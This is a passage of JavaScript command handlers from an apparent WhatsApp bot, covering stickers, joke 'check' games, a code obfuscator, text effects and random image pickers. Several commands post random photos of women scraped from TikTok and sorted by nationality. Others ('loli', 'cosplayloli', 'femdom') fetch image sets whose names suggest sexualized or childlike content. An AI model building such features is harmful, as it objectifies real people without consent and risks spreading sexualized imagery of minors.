  emas_muda: "#ffe4b5", beige: "#f5f5dc", olive: "#808000", merah_cerah: "#ff4500",
  crimson: "#dc143c", fuchsia: "#ff00ff", chocolate: "#d2691e", biru_royal: "#4169e1",
  hijau_gelap: "#006400", merah_jambu: "#ff1493", biru_es: "#e0ffff", kuning_keemasan: "#ffd700",
  jade: "#00a86b", mustard: "#ffdb58", biru_neon: "#4d4dff", aprikot: "#fbceb1",
  biru_beludru: "#483d8b", ungu_gelap: "#4b0082", pastel: "#dbb2ff", hijau_army: "#4b5320",
  pink_flamingo: "#fc74fd", ungu_terong: "#990066", biru_denim: "#1560bd", biru_baja: "#4682b4",
  kelabu_tua: "#a9a9a9", teal_muda: "#afeeee", hijau_daun: "#228b22", lavender_muda: "#e6e6fa",
  oranye_kemerahan: "#ff4500", raspberry: "#e30b5c", biru_langit_terang: "#87cefa",
  biru_arktik: "#00bfff", hijau_pastel: "#77dd77", merah_muda_terang: "#ffb6c1", kuning_neon: "#ccff00",
  emas_metalik: "#d4af37", ungu_lilac: "#c8a2c8", biru_langit_pastel: "#a1caf1", coklat_susu: "#a0522d",
  biru_petir: "#1f75fe", hijau_pistachio: "#93c572", orchid: "#da70d6", biru_pirus: "#40e0d0",
  merah_cherry: "#de3163", kuning_lemon: "#fff44f", orange_terang: "#ffae42", biru_zaitun: "#9ab973"
};
  let bgColor = "#ffffff";
  await reply('wait')
  if (!text) return m.reply("Which text?");
  if (text.length > 10000) return m.reply("Maximal 10000 character!");
  let profilePic = await NanoBotz.profilePictureUrl(m.sender, "image").catch(() => "https://i.ibb.co/3Fh9V6p/avatar-contact.png");
  const payload = {
    type: "quote",
    format: "png",
    backgroundColor: bgColor,
    width: 512,
    height: 768,
    scale: 2,
    messages: [{
      entities: [],
      avatar: true,
      from: { id: 1, name: pushname, photo: { url: profilePic } },
      text: text,
      replyMessage: {}
    }]
  };
  const response = await axios.post("https://quotly.netorare.codes/generate", payload, {
    headers: { "Content-Type": "application/json" }
  });
  const imageBuffer = Buffer.from(response.data.result.image, "base64");
    NanoBotz.sendImageAsSticker(from, imageBuffer, m, { packname: global.botname, author: global.botname })
}
break
case 's':
case 'stiker':
case 'sticker': {
  if (!quoted) return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await NanoBotz.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await NanoBotz.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
case 'quotes':
const quotexeony = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quotexeony.data.quote.body}\n\n*${themeemoji} Author:* ${quotexeony.data.quote.author}`
return replynano(textquotes)
break
case 'handsomecheck':
				if (!text) return replynano(`Tag Someone, Example : ${prefix + command} @Patron`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
NanoBotz.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
					break
case 'beautifulcheck':
				if (!text) return replynano(`Tag Someone, Example : ${prefix + command} @Patron`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
NanoBotz.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
					break
					case 'charactercheck':
					if (!text) return replynano(`Tag Someone, Example : ${prefix + command} @Patron`)
					const xeony =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = xeony[Math.floor(Math.random() * xeony.length)]
					NanoBotz.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
 case 'prettycheck':
case 'lovelycheck':
  case 'uglycheck':
if (!m.isGroup) return reply(mess.only.group)
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
NanoBotz.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
NanoBotz.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
NanoBotz.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break
case 'obfus': case 'enc': case 'obfuscate':{
if (!q) return replynano(`Example ${prefix+command} const xeonbot = require('baileys')`)
let meg = await obfus(q)
replynano(`Success
${meg.result}`)
}
break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scraper')
		if (!text) return replynano('Enter Query text!')
let anu = await styletext(text)
let teks = `Style Text From ${text}\n\n`
for (let i of anu) {
teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
}
replynano(teks)
	    }
	    break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!q) return replynano(`Example : ${prefix+command} NanoBotz`) 
NanoBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
NanoBotz.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'chinese':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
  if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/boneka.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/justina.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/kpop.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/car.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'couplepic':case 'ppcp':case 'couplepicture':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/ppcouple.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/profile.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/pubg.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/rose.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/wallml.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./data/NanoMedia/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
NanoBotz.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'animewallpaper2': case 'animewall2': {
if (!args.join(" ")) return replynano("What wallpaper are you looking for??")
		let { wallpaper } = require('./lib/scraperW')
anu = await wallpaper(args)
result = anu[Math.floor(Math.random() * anu.length)]
NanoBotz.sendMessage(m.chat, { caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] } } , { quoted: m })
            }
            break
case 'afk': {
if (!m.isGroup) return reply(mess.only.group)
if (!text) return replynano(`Example ${prefix+command} want to sleep`)
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = args.join(" ")
reply(`${m.pushName} Telah Melakukan AFK\nAlasan : ${args.join(" ") ? args.join(" ") : ''}`)
}
break
case 'animewall': case 'animewallpaper':
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return replynano('What wallpaper do you want?')
reply(mess.wait)
const wall = new AnimeWallpaper()
    const pages = [1,2,3,4]
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .getAnimeWall4({ title: q, type: "sfw", page: pages })
            .catch(() => null)
const i = Math.floor(Math.random() * wallpaper.length)    
            await NanoBotz.sendMessage(m.chat, { caption: `*Query :* ${q}`, image: {url:wallpaper[i].image} }, { quoted: m} ).catch(err => {
return('Error!')
})
break
case 'neko': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      NanoBotz.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
            }
            break
case 'loli': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      NanoBotz.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
            }
            break
            case 'waifu': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      NanoBotz.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
            }
            break
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
reply(mess.wait)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
